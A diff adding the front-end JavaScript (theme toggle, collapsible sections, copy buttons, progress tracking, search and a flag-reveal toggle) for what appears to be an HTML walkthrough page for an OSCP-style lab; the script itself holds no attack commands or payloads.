+  var saved=null;try{saved=localStorage.getItem(THEME_KEY)}catch(e){}
+  if(!saved){saved=window.matchMedia&&window.matchMedia("(prefers-color-scheme: light)").matches?"light":"dark";}
+  setTheme(saved);
+  document.getElementById("themeBtn").addEventListener("click",function(){
+    setTheme(root.getAttribute("data-theme")==="dark"?"light":"dark");
+  });
+
+  /* ---------- wrap h3 sections into collapsible cards ---------- */
+  document.querySelectorAll(".content").forEach(function(content){
+    var kids=Array.prototype.slice.call(content.children);
+    var current=null, sec=null, body=null;
+    kids.forEach(function(el){
+      if(el.tagName==="H3"){
+        sec=document.createElement("section");sec.className="sec";
+        var btn=document.createElement("button");
+        btn.type="button";btn.className="sec-head";btn.setAttribute("aria-expanded","true");
+        btn.textContent=el.textContent;
+        body=document.createElement("div");body.className="sec-body";
+        content.insertBefore(sec,el);
+        sec.appendChild(btn);sec.appendChild(body);
+        el.remove();
+        btn.addEventListener("click",function(){
+          var panel=btn.nextElementSibling;
+          var open=btn.getAttribute("aria-expanded")==="true";
+          btn.setAttribute("aria-expanded",open?"false":"true");
+          if(panel)panel.hidden=open;
+        });
+        current=body;
+      }else if(current){
+        current.appendChild(el);
+      }
+    });
+  });
+
+  /* ---------- copy buttons ---------- */
+  var toast=document.getElementById("toast"),toastTimer=null;
+  function say(msg){
+    toast.textContent=msg;toast.classList.add("show");
+    clearTimeout(toastTimer);toastTimer=setTimeout(function(){toast.classList.remove("show")},1600);
+  }
+  function copy(text,btn){
+    function ok(){if(btn){btn.classList.add("done");var t=btn.textContent;btn.textContent="Copied";
+      setTimeout(function(){btn.classList.remove("done");btn.textContent=t},1400);}say("Copied to clipboard");}
+    if(navigator.clipboard&&navigator.clipboard.writeText){
+      navigator.clipboard.writeText(text).then(ok).catch(function(){fallback(text);ok();});
+    }else{fallback(text);ok();}
+  }
+  function fallback(text){
+    var ta=document.createElement("textarea");ta.value=text;ta.style.position="fixed";ta.style.opacity="0";
+    document.body.appendChild(ta);ta.select();try{document.execCommand("copy")}catch(e){}document.body.removeChild(ta);
+  }
+  document.addEventListener("click",function(e){
+    var btn=e.target.closest(".copy");
+    if(!btn)return;
+    var block=btn.closest(".block"),pre=block&&block.querySelector("pre");
+    if(pre)copy(pre.innerText.replace(/\s+$/,""),btn);
+  });
+
+  /* copy every command in a chapter */
+  document.querySelectorAll(".copyall").forEach(function(btn){
+    btn.addEventListener("click",function(){
+      var ch=btn.closest(".chapter");
+      var cmds=Array.prototype.map.call(ch.querySelectorAll(".block-cmd pre"),function(p){return p.innerText.replace(/\s+$/,"")});
+      if(!cmds.length){say("No commands in this chapter");return;}
+      copy(cmds.join("\n\n"),btn);
+    });
+  });
+
+  /* ---------- progress ---------- */
+  var PKEY="oscp-progress-vesta-snmp";
+  var checks=Array.prototype.slice.call(document.querySelectorAll(".nav-check"));
+  var done={};try{done=JSON.parse(localStorage.getItem(PKEY)||"{}")}catch(e){}
+  function paint(){
+    var n=0;
+    checks.forEach(function(c){
+      var on=!!done[c.dataset.ch];
+      c.checked=on;
+      c.closest(".nav-item").classList.toggle("done",on);
+      if(on)n++;
+    });
+    var pct=Math.round(n/checks.length*100);
+    document.getElementById("bar").style.width=pct+"%";
+    document.getElementById("pcount").textContent=n+" / "+checks.length;
+    document.getElementById("ppct").textContent=pct+"%";
+  }
+  checks.forEach(function(c){
+    c.addEventListener("click",function(e){e.stopPropagation()});
+    c.addEventListener("change",function(){
+      done[c.dataset.ch]=c.checked;
+      try{localStorage.setItem(PKEY,JSON.stringify(done))}catch(e){}
+      paint();
+    });
+  });
+  paint();
+  document.getElementById("resetProgress").addEventListener("click",function(){
+    done={};try{localStorage.setItem(PKEY,"{}")}catch(e){}paint();say("Progress reset");
+  });
+
+  /* ---------- expand / collapse all ---------- */
+  function setAll(open){
+    document.querySelectorAll(".sec-head").forEach(function(b){
+      b.setAttribute("aria-expanded",open?"true":"false");
+      b.nextElementSibling.hidden=!open;
+    });
+  }
+  document.getElementById("expandAll").addEventListener("click",function(){setAll(true)});
+  document.getElementById("collapseAll").addEventListener("click",function(){setAll(false)});
+
+  /* ---------- scroll spy ---------- */
+  var navItems=Array.prototype.slice.call(document.querySelectorAll(".nav-item"));
+  var chapters=Array.prototype.slice.call(document.querySelectorAll(".chapter"));
+  if("IntersectionObserver" in window){
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(!en.isIntersecting)return;
+        navItems.forEach(function(n){n.classList.toggle("active",n.dataset.target===en.target.id)});
+      });
+    },{rootMargin:"-70px 0px -70% 0px",threshold:0});
+    chapters.forEach(function(c){io.observe(c)});
+  }
+
+  /* ---------- search ---------- */
+  var input=document.getElementById("search"),count=document.getElementById("searchCount");
+  var index=chapters.map(function(c){
+    return {el:c,item:document.querySelector('.nav-item[data-target="'+c.id+'"]'),
+            text:(c.dataset.title+" "+c.textContent).toLowerCase()};
+  });
+  function clearMarks(){
+    document.querySelectorAll("mark.hit").forEach(function(m){
+      var p=m.parentNode;m.replaceWith(document.createTextNode(m.textContent));p.normalize();
+    });
+  }
+  function run(){
+    var q=input.value.trim().toLowerCase();
+    clearMarks();
+    if(!q){
+      index.forEach(function(r){r.item.style.display="";r.el.style.display=""});
+      count.textContent="";return;
+    }
+    var hits=0,first=null;
+    index.forEach(function(r){
+      var hit=r.text.indexOf(q)!==-1;
+      r.item.style.display=hit?"":"none";
+      r.el.style.display=hit?"":"none";
+      if(hit){hits++;if(!first)first=r;}
+    });
+    count.textContent=hits?hits+" chapter"+(hits>1?"s":""):"no match";
+    if(first&&hits===1){first.el.scrollIntoView({block:"start"});}
+  }
+  var t=null;
+  input.addEventListener("input",function(){clearTimeout(t);t=setTimeout(run,140)});
+  input.addEventListener("keydown",function(e){
+    if(e.key==="Escape"){input.value="";run();input.blur();}
+    if(e.key==="Enter"){var vis=index.filter(function(r){return r.item.style.display!=="none"});if(vis.length){vis[0].el.scrollIntoView({block:"start"})}}
+  });
+
+  /* ---------- keyboard ---------- */
+  document.addEventListener("keydown",function(e){
+    var typing=/^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement.tagName);
+    if(e.key==="/"&&!typing){e.preventDefault();input.focus();input.select();}
+  });
+
+  /* ---------- mobile sidebar ---------- */
+  var sidebar=document.getElementById("sidebar");
+  document.getElementById("burger").addEventListener("click",function(){sidebar.classList.toggle("open")});
+  navItems.forEach(function(n){n.addEventListener("click",function(){sidebar.classList.remove("open")})});
+
+  /* ---------- flag reveal ---------- */
+  document.querySelectorAll(".flag .reveal").forEach(function(b){
+    b.addEventListener("click",function(){
+      var flag=b.closest(".flag"),v=flag.querySelector(".v");
+      var val=v.dataset.value;
+      var on=flag.classList.toggle("revealed");
+      v.innerHTML=on?'<span>'+val+'</span>':'<span class="masked">••••••••••••••••••••••••••••••••</span>';
+      b.textContent=on?"hide":"reveal";
+    });
+  });
+
+  /* ---------- back to top ---------- */
+  var topBtn=document.getElementById("toTop");
+  window.addEventListener("scroll",function(){
+    topBtn.classList.toggle("show",window.scrollY>600);
+  },{passive:true});
+  topBtn.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"})});
+
+  /* ---------- deep links ---------- */
+  if(location.hash){
+    var target=document.querySelector(location.hash);
+    if(target)setTimeout(function(){target.scrollIntoView({block:"start"})},60);
+  }
+})();
+</script>
+</body>
+</html>
